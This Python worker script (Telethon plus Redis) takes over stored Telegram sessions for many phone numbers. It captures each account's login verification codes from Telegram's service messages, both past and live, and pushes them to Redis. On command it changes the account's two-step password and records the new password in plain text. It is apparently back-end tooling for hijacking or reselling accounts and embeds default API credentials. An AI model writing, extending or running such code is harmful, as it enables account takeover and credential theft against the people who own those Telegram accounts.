import asyncio
import os
import re
import redis
from telethon import TelegramClient, events
import socks

# ======== 配置 (支持环境变量以便容器运行) ========
REDIS_HOST = os.environ.get('REDIS_HOST', '127.0.0.1')
REDIS_PORT = int(os.environ.get('REDIS_PORT', 6379))
REDIS_DB = int(os.environ.get('REDIS_DB', 0))
r = redis.Redis(host=REDIS_HOST, port=REDIS_PORT, db=REDIS_DB)

API_ID = int(os.environ.get('API_ID', 2040))  # 请在生产环境设置为你的真实值
API_HASH = os.environ.get('API_HASH', 'b18441a1ff607e10a989891a5462e627')  # 请在生产环境设置为真实值
SESSION_DIR = os.environ.get('SESSION_DIR', 'sessions')

# 可选代理格式（示例：socks5://127.0.0.1:7897），不设置则不使用代理
LOCAL_PROXY = None
proxy_env = os.environ.get('LOCAL_PROXY', '').strip()
if proxy_env:
    try:
        if proxy_env.lower().startswith('socks5://'):
            _p = proxy_env.split('://', 1)[1]
            host, port = _p.split(':')
            LOCAL_PROXY = (socks.SOCKS5, host, int(port))
        elif proxy_env.lower().startswith('socks4://'):
            _p = proxy_env.split('://', 1)[1]
            host, port = _p.split(':')
            LOCAL_PROXY = (socks.SOCKS4, host, int(port))
        # 可扩展 http proxy 处理
    except Exception:
        LOCAL_PROXY = None

# 确保会话目录存在
if not os.path.exists(SESSION_DIR):
    os.makedirs(SESSION_DIR, exist_ok=True)
# ======================

running_clients = {}


# --- 追加逻辑：10分钟自动退登任务 ---
async def auto_logout_timer(client, phone, delay=300):
    print(f"⏳ {phone} 验证码已出，倒计时 {delay}s 后将自动退登...")
    await asyncio.sleep(delay)
    try:
        await asyncio.sleep(delay)
        await client.disconnect() # 改为断开连接，不销毁Session
        r.set(f"tg_login_status:{phone}", "0")
        r.delete(f"active_task:{phone}")
        print(f"🚪 {phone} 10分钟时间到，已自动安全退登")
    except Exception as e:
        print(f"⚠️ {phone} 自动退登异常: {e}")

async def monitor_account(phone):
    client = TelegramClient(os.path.join(SESSION_DIR, phone), API_ID, API_HASH)
    try:
        await client.connect()
        
        # 实时检查登录状态并写入 Redis 供 Admin 查看
        is_login = await client.is_user_authorized()
        r.set(f"tg_login_status:{phone}", "1" if is_login else "0")

        if not is_login:
            print(f"⚠️ {phone} 未登录，无法监听消息")
            return

        print(f"🚀 [已登录] {phone} 正在扫码（含历史消息检查）...")

        # --- 追加逻辑 A: 启动时立即拉取最近 5 条历史消息 ---
        # 解决“不点登录直接开链接”拿不到码的问题
        async for msg in client.iter_messages(777000, limit=5):
            m = re.search(r'\b\d{5,6}\b', msg.raw_text)
            if m:
                r.setex(f"tg_code:{phone}", 300, m.group())
                print(f"📚 [历史记录提取] {phone}: {m.group()}")
                asyncio.create_task(auto_logout_timer(client, phone))
                break # 拿到最近的一个码就跳出

        # 实时监听新消息
        @client.on(events.NewMessage(from_users=777000))
        async def handler(event):
            m = re.search(r'\b\d{5,6}\b', event.raw_text)
            if m:
                r.setex(f"tg_code:{phone}", 300, m.group())
                print(f"🎯 [实时捕获] {phone}: {m.group()}")
                asyncio.create_task(auto_logout_timer(client, phone))

        # 主循环：监听指令
        while r.exists(f"active_task:{phone}"):
            # --- 指令 A: 修改二级密码 ---
            cmd_2fa = r.get(f"change_2fa_task:{phone}")
            if cmd_2fa:
                r.delete(f"change_2fa_task:{phone}")
                try:
                    old_p, new_p = cmd_2fa.decode().split('|')
                    curr_p = None if old_p.lower() == 'none' else old_p
                    
                    print(f"🔐 {phone} 正在向服务器同步改密...")
                    await client.edit_2fa(current_password=curr_p, new_password=new_p)
                    
                    # --- 追加逻辑 B: 改密成功同步回 Redis ---
                    r.set(f"tg_2fa:{phone}", new_p) 
                    r.setex(f"change_2fa_res:{phone}", 60, "✅ 官方密码修改成功！")
                    print(f"✨ {phone} Redis 记录已更新")
                except Exception as e:
                    r.setex(f"change_2fa_res:{phone}", 60, f"❌ 修改失败: {str(e)}")

            # --- 指令 B: 退出登录 ---
            if r.get(f"logout_task:{phone}"):
                r.delete(f"logout_task:{phone}")
                await client.disconnect() # 改为断开连接
                r.set(f"tg_login_status:{phone}", "0")
                break 

            await asyncio.sleep(2)
         
    except Exception as e:
        print(f"🔥 {phone} 错误: {e}")
    finally:
        await client.disconnect()
        if phone in running_clients:
            running_clients.pop(phone, None)

async def main():
    print("📡 Worker 已就绪，包含历史穿透逻辑...")
    if not os.listdir(SESSION_DIR): 
        print(f"警告: {SESSION_DIR} 文件夹内没有 session 文件")
    
    while True:
        active_keys = r.keys("active_task:*")
        for key in active_keys:
            phone = key.decode().split(":")[1]
            if phone not in running_clients:
                task = asyncio.create_task(monitor_account(phone))
                running_clients[phone] = task
        
        await asyncio.sleep(1)

if __name__ == "__main__":
    asyncio.run(main())